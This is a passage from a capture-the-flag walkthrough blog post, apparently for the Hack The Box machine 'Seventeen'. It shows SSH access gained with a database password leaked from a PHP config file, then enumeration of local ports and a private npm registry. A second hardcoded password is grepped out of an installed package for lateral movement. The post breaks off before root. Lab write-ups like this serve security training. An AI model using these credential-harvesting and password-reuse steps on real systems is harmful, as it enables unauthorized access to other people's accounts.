$dbPassword = &quot;2020bestyearofmylife&quot;;
$dBName = &quot;ems&quot;;

$conn = mysqli_connect($servername, $dBUsername, $dbPassword, $dBName);

if(!$conn){
        echo &quot;Databese Connection Failed&quot;;
}

?&gt;
</code></pre><p>And we can ssh as mark with this password!</p>
<pre tabindex="0"><code>$ssh mark@seventeen.htb
The authenticity of host 'seventeen.htb (10.10.11.165)' can't be established.
ECDSA key fingerprint is SHA256:9yQJzo3BRPcH9ll7nS2DgdbYMIsKNYFqYfpACm2s9A8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'seventeen.htb' (ECDSA) to the list of known hosts.
mark@seventeen.htb's password:
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-177-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Sep 30 00:17:47 UTC 2022

  System load:                    0.0
  Usage of /:                     60.1% of 11.75GB
  Memory usage:                   50%
  Swap usage:                     0%
  Processes:                      367
  Users logged in:                0
  IP address for eth0:            10.10.11.165
  IP address for br-b3834f770aa3: 172.18.0.1
  IP address for br-cc437cf0c6a8: 172.19.0.1
  IP address for br-3539a4850ffa: 172.20.0.1
  IP address for docker0:         172.17.0.1


18 updates can be applied immediately.
12 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


Last login: Tue May 31 18:03:16 2022 from 10.10.14.23
mark@seventeen:~$ ls
users.txt
</code></pre><p>And we also got user flag !</p>
<h2 id="kavi-shell--pe">
  Kavi shell | PE
  <a href="#kavi-shell--pe" class="h-anchor" aria-hidden="true">#</a>
</h2>
<p>There is a mail for kavi in /var/mail/kavi:</p>
<pre tabindex="0"><code>mark@seventeen:~$ cat /var/mail/kavi
To: kavi@seventeen.htb
From: admin@seventeen.htb
Subject: New staff manager application

Hello Kavishka,

Sorry I couldn't reach you sooner. Good job with the design. I loved it.

I think Mr. Johnson already told you about our new staff management system. Since our old one had some problems, they are hoping maybe we could migrate to a more modern one. For the first phase, he asked us just a simple web UI to store the details of the staff members.

I have already done some server-side for you. Even though, I did come across some problems with our private registry. However as we agreed, I removed our old logger and added loglevel instead. You just have to publish it to our registry and test it with the application.

Cheers,
Mike
</code></pre><p>Seems interesting.</p>
<p>If wel list the listening ports</p>
<pre tabindex="0"><code>mark@seventeen:~$ netstat -tnlp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name  
tcp        0      0 127.0.0.1:993           0.0.0.0:*               LISTEN      -                 
tcp        0      0 127.0.0.1:995           0.0.0.0:*               LISTEN      -                 
tcp        0      0 127.0.0.1:43717         0.0.0.0:*               LISTEN      -                 
tcp        0      0 127.0.0.1:4873          0.0.0.0:*               LISTEN      -

tcp        0      0 172.18.0.1:3306         0.0.0.0:*               LISTEN      -

tcp        0      0 127.0.0.1:110           0.0.0.0:*               LISTEN      -

tcp        0      0 127.0.0.1:143           0.0.0.0:*               LISTEN      -

tcp        0      0 127.0.0.1:6000          0.0.0.0:*               LISTEN      -

tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -

tcp        0      0 127.0.0.1:6001          0.0.0.0:*               LISTEN      -

tcp        0      0 127.0.0.1:8081          0.0.0.0:*               LISTEN      -

tcp        0      0 127.0.0.1:6002          0.0.0.0:*               LISTEN      -

tcp        0      0 127.0.0.1:6003          0.0.0.0:*               LISTEN      -

tcp        0      0 127.0.0.1:6004          0.0.0.0:*               LISTEN      -

tcp        0      0 127.0.0.1:6005          0.0.0.0:*               LISTEN      -

tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -

tcp        0      0 127.0.0.1:6006          0.0.0.0:*               LISTEN      -

tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -

tcp        0      0 127.0.0.1:6007          0.0.0.0:*               LISTEN      -

tcp        0      0 127.0.0.1:6008          0.0.0.0:*               LISTEN      -

tcp        0      0 127.0.0.1:6009          0.0.0.0:*               LISTEN      -

tcp6       0      0 :::22                   :::*                    LISTEN      -

</code></pre><p>Most of them are known, except the 4873 one.</p>
<p>If we hit it with a curl request we&rsquo;ll get a verdaccio service host</p>
<pre tabindex="0"><code>mark@seventeen:~$ curl localhost:4873

    &lt;!DOCTYPE html&gt;
      &lt;html lang=&quot;en-us&quot;&gt;
      &lt;head&gt;
        &lt;meta charset=&quot;utf-8&quot;&gt;
        &lt;base href=&quot;http://localhost:4873/&quot;&gt;
        &lt;title&gt;Verdaccio&lt;/title&gt;
        &lt;link rel=&quot;icon&quot; href=&quot;http://localhost:4873/-/static/favicon.ico&quot;/&gt;
        &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot; /&gt;
        &lt;script&gt;
            window.__VERDACCIO_BASENAME_UI_OPTIONS={&quot;darkMode&quot;:false,&quot;basename&quot;:&quot;/&quot;,&quot;base&quot;:&quot;http://localhost:4873/&quot;,&quot;primaryColor&quot;:&quot;#4b5e40&quot;,&quot;version&quot;:&quot;5.6.0&quot;,&quot;pkgManagers&quot;:[&quot;yarn&quot;,&quot;pnpm&quot;,&quot;npm&quot;],&quot;login&quot;:true,&quot;logo&quot;:&quot;&quot;,&quot;title&quot;:&quot;Verdaccio&quot;,&quot;scope&quot;:&quot;&quot;,&quot;language&quot;:&quot;es-US&quot;}
        &lt;/script&gt;

      &lt;/head&gt;
      &lt;body class=&quot;body&quot;&gt;

        &lt;div id=&quot;root&quot;&gt;&lt;/div&gt;
        &lt;script defer=&quot;defer&quot; src=&quot;http://localhost:4873/-/static/runtime.06493eae2f534100706f.js&quot;&gt;&lt;/script&gt;&lt;script defer=&quot;defer&quot; src=&quot;http://localhost:4873/-/static/vendors.06493eae2f534100706f.js&quot;&gt;&lt;/script&gt;&lt;script defer=&quot;defer&quot; src=&quot;http://localhost:4873/-/static/main.06493eae2f534100706f.js&quot;&gt;&lt;/script&gt;

      &lt;/body&gt;
    &lt;/html&gt;
</code></pre><blockquote>
<p>Verdaccio is a simple, zero-config-required local private NPM registry. No need for an entire database just to get started. Verdaccio comes out of the box with its own tiny database, and the ability to proxy other registries (eg. npmjs.org), also introduces caching the downloaded modules along the way.</p>
</blockquote>
<p>The email above is refering to it and mentioning about using a old registry, I&rsquo;ll try to dump the logging if are.</p>
<pre tabindex="0"><code>mark@seventeen:~$ npm search log --registry http://localhost:4873
NAME      DESCRIPTION                                                  AUTHOR     DATE       VERSION KEYWORDS
db-logger Log data to a database                                       =kavigihan 2022-03-15 1.0.1   log
loglevel  Minimal lightweight logging for JavaScript, adding reliableâ€¦ =pimterry  2022-05-11 1.8.0   log logger logging browser
</code></pre><p>db-logged should be the old one, and it&rsquo;s written by kavi short form of kavigihan</p>
<p>I&rsquo;ll request it with <code>npm install</code></p>
<pre tabindex="0"><code>mark@seventeen:~$ npm install db-logger --registry http://localhost:4873
/home/mark
â””â”€â”¬ db-logger@1.0.1
  â””â”€â”¬ mysql@2.18.1
    â”œâ”€â”€ bignumber.js@9.0.0
    â”œâ”€â”¬ readable-stream@2.3.7
    â”‚ â”œâ”€â”€ core-util-is@1.0.3
    â”‚ â”œâ”€â”€ inherits@2.0.4
    â”‚ â”œâ”€â”€ isarray@1.0.0
    â”‚ â”œâ”€â”€ process-nextick-args@2.0.1
    â”‚ â”œâ”€â”€ string_decoder@1.1.1
    â”‚ â””â”€â”€ util-deprecate@1.0.2
    â”œâ”€â”€ safe-buffer@5.1.2
    â””â”€â”€ sqlstring@2.3.1

npm WARN enoent ENOENT: no such file or directory, open '/home/mark/package.json'
npm WARN mark No description
npm WARN mark No repository field.
npm WARN mark No README data
npm WARN mark No license field.
</code></pre><p>If we enumerate for password we got this results:</p>
<pre tabindex="0"><code>mark@seventeen:~$ grep -r &quot;password:&quot; .
./node_modules/db-logger/logger.js:  password: &quot;IhateMathematics123#&quot;,
./node_modules/mysql/lib/protocol/sequences/ChangeUser.js:    password: this._password
./node_modules/mysql/lib/protocol/sequences/Handshake.js:    password: this._config.password
</code></pre><p>Cool! we can shell as kavi with <code>IhateMathematics123#</code></p>
<h2 id="shell-as-root--pe">
  Shell as root | PE
  <a href="#shell-as-root--pe" class="h-anchor" aria-hidden="true">#</a>
</h2>
<p>To be continued.</p>

    </div>
    
      
        <div class="pagination">
          <div class="pagination__title">
            <span class="pagination__title-h"
              >Read other posts</span
            >
            <hr />
          </div>
          <div class="pagination__buttons">
            
              <span class="button previous">
                <a href="https://0xwerz.github.io/11/04/2020/tips-and-tricks/">
                  <span class="button__icon">â†</span>
                  <span class="button__text">Tips-and-Tricks -- 247CTF walkthrough </span>
                </a>
              </span>
            
            
          </div>
        </div>
      
    

    
      
        

      
    
  </div>

      </div>

      
        <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright copyright--user">Â© 2022 Powered by Hugo</div>
      
  </div>
</footer>

<script src="https://0xwerz.github.io/assets/main.js"></script>
<script src="https://0xwerz.github.io/assets/prism.js"></script>


      
    </div>

    
      
<script async src="https://www.googletagmanager.com/gtag/js?id=G-R2DLLBQDPX"></script>
<script>
var doNotTrack = false;
if (!doNotTrack) {
	window.dataLayer = window.dataLayer || [];
	function gtag(){dataLayer.push(arguments);}
	gtag('js', new Date());
	gtag('config', 'G-R2DLLBQDPX', { 'anonymize_ip': false });
}
</script>

    
  </body>
</html>
